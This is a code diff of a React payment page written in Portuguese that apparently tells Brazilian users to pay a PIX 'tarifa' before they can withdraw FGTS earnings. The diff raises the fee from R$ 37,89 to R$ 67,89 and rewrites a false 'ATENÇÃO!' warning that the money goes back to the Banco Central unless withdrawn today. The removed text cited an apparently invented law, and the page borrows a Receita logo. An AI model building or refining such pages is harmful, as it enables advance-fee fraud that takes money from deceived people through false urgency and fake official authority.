@@ -61,8 +61,8 @@ export function PagamentoTarifa() {
 
     const questions = [
         {
-            question: "Por que é cobrado uma taxa de R$ 37,89?",
-            answer: "A taxa de R$ 37,89 é aplicada para cobrir os custos operacionais da transação, incluindo a administração e a segurança do seu saque. Essa tarifa garante que todo o processo seja realizado de maneira eficiente e segura, proporcionando a você um serviço confiável.",
+            question: "Por que é cobrado uma taxa de R$ 67,89?",
+            answer: "A taxa de R$ 67,89 é aplicada para cobrir os custos operacionais da transação, incluindo a administração e a segurança do seu saque. Essa tarifa garante que todo o processo seja realizado de maneira eficiente e segura, proporcionando a você um serviço confiável.",
         },
         {
             question: "Por que vocês não descontam a taxa do meu saque?",
@@ -150,9 +150,7 @@ export function PagamentoTarifa() {
                         <h2 className="text-3xl font-bold text-red-500">ATENÇÃO!</h2>
                     </div>
 
-                    <h2 className="text-xl text-center text-red-600">
-                        Caso não saque o dinheiro hoje, essa quantia será imediatamente bloqueada e disponibilizada ao <span className="font-bold">Tesouro Nacional</span> conforme lei 1.847/24
-                    </h2>
+                    <h2 className="text-xl  text-red-600">Caso não saque os rendimentos do FGTS hoje, o seu dinheiro será devolvido para o <span className="font-bold">Banco Central</span></h2>
 
                     <img src={receita} alt="receita" width={140} />
 
@@ -169,7 +167,7 @@ export function PagamentoTarifa() {
                         <p className="text-2xl font-thin text-zinc-400">R$: 127,65 por: </p>
                         <div className="flex justify-center space-x-6">
                             <img src={pix} alt="pix" width={100} />
-                            <p className="text-4xl font-extrabold text-green-700">R$ 37,89</p>
+                            <p className="text-4xl font-extrabold text-green-700">R$ 67,89</p>
                         </div>
                     </div>
 
